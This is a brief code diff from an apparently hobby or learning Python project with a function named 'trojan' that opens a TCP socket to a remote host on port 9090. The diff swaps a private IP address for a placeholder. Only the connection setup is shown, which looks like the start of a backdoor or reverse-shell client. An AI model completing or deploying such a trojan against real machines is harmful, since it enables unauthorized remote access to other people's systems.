@@ -4,7 +4,7 @@ import os
 
 def trojan():
 
-    HOST = "192.168.43.159"
+    HOST = "192.168.43.OTHER COMPUTER IP"
     PORT = 9090
 
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
